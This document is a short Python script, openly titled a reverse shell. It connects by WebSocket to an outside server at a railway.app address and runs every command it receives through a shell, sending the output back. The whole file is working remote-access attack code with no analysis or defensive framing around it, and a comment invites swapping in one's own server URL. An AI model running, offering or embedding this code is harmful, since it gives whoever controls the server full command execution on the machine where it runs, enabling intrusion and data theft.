import asyncio
import websockets
import subprocess

async def reverse_shell():
    uri = "ws://web-production-39bd.up.railway.app/ws"  # replace with your Deta Space URL
    async with websockets.connect(uri) as websocket:
        while True:
            try:
                command = await websocket.recv()

                if command.lower() in ["exit", "quit"]:
                    break

                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = proc.communicate()
                result = (output + error).decode()

                if not result:
                    result = "[No output]"

                await websocket.send(result)
            except Exception as e:
                await websocket.send(f"Error: {str(e)}")

asyncio.run(reverse_shell())
